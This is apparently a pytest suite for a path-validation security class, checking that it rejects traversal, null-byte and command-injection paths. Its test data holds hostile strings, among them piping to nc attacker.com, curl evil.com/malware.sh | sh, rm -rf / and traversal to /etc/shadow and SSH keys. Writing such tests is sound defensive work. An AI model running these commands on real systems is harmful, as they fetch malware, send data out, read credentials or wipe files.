"""
Test suite for xSystem PathValidator security functionality.
Tests path validation, security checks, and injection detection.
Following Python/pytest best practices.
"""

import pytest
import sys
import tempfile
import os
from pathlib import Path

# Add src to path for imports - navigate to project root then to src
src_path = str(Path(__file__).parent.parent.parent.parent.parent.parent / "src")
if src_path not in sys.path:
    sys.path.insert(0, src_path)

try:
    from exonware.xsystem.security.path_validator import PathValidator, PathSecurityError
except ImportError as e:
    pytest.skip(f"PathValidator import failed: {e}", allow_module_level=True)


@pytest.mark.xsystem_security
class TestPathValidatorBasic:
    """Test suite for basic PathValidator functionality."""
    
    def test_path_validator_creation(self, temp_dir):
        """Test creating PathValidator instance."""
        validator = PathValidator(base_path=temp_dir)
        assert validator is not None
        assert validator.base_path == temp_dir
    
    def test_safe_path_validation(self, temp_dir, safe_paths):
        """Test validation of safe paths."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        for safe_path in safe_paths:
            try:
                result = validator.validate_path(safe_path)
                assert result is not None, f"Safe path validation failed: {safe_path}"
            except (PathSecurityError, PermissionError, FileNotFoundError):
                pytest.fail(f"Safe path rejected: {safe_path}")
    
    def test_malicious_path_rejection(self, temp_dir, malicious_paths):
        """Test rejection of malicious paths."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        for malicious_path in malicious_paths:
            with pytest.raises((PathSecurityError, ValueError)):
                validator.validate_path(malicious_path)


@pytest.mark.xsystem_security
class TestPathValidatorFilenames:
    """Test suite for filename validation."""
    
    def test_safe_filename_validation(self):
        """Test validation of safe filenames."""
        validator = PathValidator()
        
        safe_filenames = [
            "document.txt",
            "image.jpg",
            "data.json",
            "script.py",
            "archive.zip"
        ]
        
        for filename in safe_filenames:
            result = validator.is_safe_filename(filename)
            assert result is True, f"Safe filename rejected: {filename}"
    
    def test_malicious_filename_rejection(self):
        """Test rejection of malicious filenames."""
        validator = PathValidator()
        
        malicious_filenames = [
            "../document.txt",
            "..\\file.txt",
            "file;rm -rf /",
            "file|malicious",
            "file$(command).txt",
            "file`command`.txt",
            "file\x00.txt"
        ]
        
        for filename in malicious_filenames:
            result = validator.is_safe_filename(filename)
            assert result is False, f"Malicious filename accepted: {filename}"


@pytest.mark.xsystem_security
class TestPathValidatorTraversal:
    """Test suite for directory traversal detection."""
    
    def test_simple_traversal_detection(self, temp_dir):
        """Test detection of simple directory traversal."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        traversal_attempts = [
            "../file.txt",
            "../../file.txt", 
            "../../../file.txt",
            "folder/../../../file.txt",
            "folder/../../file.txt"
        ]
        
        for attempt in traversal_attempts:
            with pytest.raises((PathSecurityError, ValueError)):
                validator.validate_path(attempt)
    
    def test_complex_traversal_detection(self, temp_dir):
        """Test detection of complex directory traversal."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        complex_attempts = [
            "valid_folder/../../../etc/passwd",
            "files/docs/../../../../../../etc/shadow",
            "uploads/../../../windows/system32/config",
            "data/./../../conf/secrets.txt",
            "temp/folder/.././../../../private/keys"
        ]
        
        for attempt in complex_attempts:
            with pytest.raises((PathSecurityError, ValueError)):
                validator.validate_path(attempt)
    
    def test_windows_traversal_detection(self, temp_dir):
        """Test detection of Windows-style directory traversal."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        windows_attempts = [
            "..\\file.txt",
            "..\\..\\file.txt",
            "folder\\..\\..\\..\\file.txt",
            "..\\..\\..\\windows\\system32\\config\\sam"
        ]
        
        for attempt in windows_attempts:
            with pytest.raises((PathSecurityError, ValueError)):
                validator.validate_path(attempt)


@pytest.mark.xsystem_security
class TestPathValidatorInjection:
    """Test suite for injection attack detection."""
    
    def test_null_byte_injection(self, temp_dir):
        """Test detection of null byte injection."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        null_byte_attempts = [
            "file.txt\x00.jpg",
            "data\x00../../etc/passwd",
            "upload.php\x00.txt",
            "safe_file\x00malicious_extension"
        ]
        
        for attempt in null_byte_attempts:
            with pytest.raises(PathSecurityError):
                validator.validate_path(attempt)
    
    def test_command_injection(self, temp_dir):
        """Test detection of command injection attempts."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        command_attempts = [
            "file.txt; rm -rf /",
            "data.json && cat /etc/passwd",
            "file.txt | nc attacker.com 4444",
            "file.txt; curl evil.com/malware.sh | sh",
            "data.xml`malicious_command`",
            "file$(evil_command).txt"
        ]
        
        for attempt in command_attempts:
            with pytest.raises(PathSecurityError):
                validator.validate_path(attempt)
    
    def test_dangerous_pattern_detection(self, temp_dir):
        """Test detection of dangerous patterns."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        dangerous_attempts = [
            "file~backup.txt",
            "data$variable.txt",
            "file(script).txt",
            "data>output.txt",
            "file<input.txt"
        ]
        
        for attempt in dangerous_attempts:
            with pytest.raises(PathSecurityError):
                validator.validate_path(attempt)


@pytest.mark.xsystem_security
class TestPathValidatorEdgeCases:
    """Test suite for PathValidator edge cases."""
    
    def test_empty_path(self, temp_dir):
        """Test handling of empty paths."""
        validator = PathValidator(base_path=temp_dir)
        
        empty_cases = ["", None]
        
        for empty_case in empty_cases:
            with pytest.raises(PathSecurityError):
                validator.validate_path(empty_case)
    
    def test_very_long_path(self, temp_dir):
        """Test handling of very long paths."""
        validator = PathValidator(base_path=temp_dir, max_path_length=100)
        
        # Create path longer than limit
        long_path = "a" * 150 + ".txt"
        with pytest.raises(PathSecurityError):
            validator.validate_path(long_path)
    
    def test_unicode_paths(self, temp_dir):
        """Test handling of unicode paths."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        unicode_paths = [
            "файл.txt",  # Cyrillic
            "文件.json",  # Chinese
            "dosyası.txt" # Turkish
        ]
        
        for unicode_path in unicode_paths:
            try:
                result = validator.validate_path(unicode_path)
                assert result is not None
            except (PathSecurityError, UnicodeError):
                # Unicode handling varies by system - either should work or fail gracefully
                pass
    
    def test_absolute_path_handling(self, temp_dir):
        """Test handling of absolute paths."""
        # Disallow absolute paths
        validator = PathValidator(base_path=temp_dir, allow_absolute=False, check_existence=False)
        
        absolute_paths = [
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "/tmp/test.txt"
        ]
        
        for abs_path in absolute_paths:
            with pytest.raises(PathSecurityError):
                validator.validate_path(abs_path)
        
        # Allow absolute paths
        validator_allow = PathValidator(base_path=None, allow_absolute=True, check_existence=False)
        
        try:
            result = validator_allow.validate_path("/tmp/test.txt")
            assert result is not None
        except (PermissionError, FileNotFoundError):
            # These are acceptable for non-existent paths
            pass


@pytest.mark.xsystem_security
class TestPathValidatorSystemPaths:
    """Test suite for system path protection."""
    
    def test_unix_system_paths(self):
        """Test protection of Unix system paths."""
        # Only test Unix paths on Unix-like systems
        if os.name != 'posix':
            pytest.skip("Unix system path test skipped on non-Unix system")
        
        validator = PathValidator(allow_absolute=True, check_existence=False)
        
        unix_system_paths = [
            "/etc/passwd",
            "/etc/shadow", 
            "/root/.ssh/id_rsa",
            "/var/log/auth.log",
            "/proc/version",
            "/sys/kernel/debug"
        ]
        
        for sys_path in unix_system_paths:
            with pytest.raises(PathSecurityError):
                validator.validate_path(sys_path)
    
    def test_windows_system_paths(self):
        """Test protection of Windows system paths."""
        # Only test Windows paths on Windows systems
        if os.name != 'nt':
            pytest.skip("Windows system path test skipped on non-Windows system")
            
        validator = PathValidator(allow_absolute=True, check_existence=False)
        
        windows_system_paths = [
            "C:\\Windows\\System32\\config\\sam",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Program Files\\sensitive\\data.txt"
        ]
        
        for sys_path in windows_system_paths:
            with pytest.raises(PathSecurityError):
                validator.validate_path(sys_path)
    
    def test_cross_platform_dangerous_paths(self):
        """Test protection that works across platforms."""
        validator = PathValidator(allow_absolute=False, check_existence=False)
        
        # These should be rejected regardless of platform
        dangerous_relative_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "folder/../../../sensitive/data",
            "uploads/../../config/secrets.txt"
        ]
        
        for dangerous_path in dangerous_relative_paths:
            with pytest.raises((PathSecurityError, ValueError)):
                validator.validate_path(dangerous_path)


@pytest.mark.xsystem_security
class TestPathValidatorIntegration:
    """Integration tests for real-world scenarios."""
    
    def test_file_upload_scenario(self, temp_dir):
        """Test realistic file upload validation scenario."""
        validator = PathValidator(base_path=temp_dir, check_existence=False)
        
        # Safe uploads
        safe_uploads = [
            "document.pdf",
            "image.jpg",
            "data.json",
            "folder/file.txt"
        ]
        
        for upload in safe_uploads:
            try:
                result = validator.validate_path(upload)
                assert result is not None
            except (PathSecurityError, PermissionError):
                pytest.fail(f"Safe upload rejected: {upload}")
        
        # Malicious uploads  
        malicious_uploads = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "file.php\x00.jpg",
            "script; rm -rf /.txt"
        ]
        
        for upload in malicious_uploads:
            with pytest.raises((PathSecurityError, ValueError)):
                validator.validate_path(upload)
    
    def test_config_file_access(self, temp_dir):
        """Test config file access validation."""
        # Create test config directory
        config_dir = temp_dir / "config"
        config_dir.mkdir()
        
        validator = PathValidator(base_path=config_dir, check_existence=False)
        
        # Safe config access
        safe_configs = [
            "app.conf",
            "database.ini", 
            "settings/user.json",
            "templates/default.xml"
        ]
        
        for config in safe_configs:
            try:
                result = validator.validate_path(config)
                assert result is not None
            except (PathSecurityError, PermissionError):
                pytest.fail(f"Safe config access rejected: {config}")
        
        # Malicious config access
        malicious_configs = [
            "../../../etc/passwd",
            "../../sensitive/keys.pem",
            "../database/passwords.db"
        ]
        
        for config in malicious_configs:
            with pytest.raises((PathSecurityError, ValueError)):
                validator.validate_path(config)


if __name__ == "__main__":
    # Allow direct execution
    pytest.main([__file__, "-v"]) 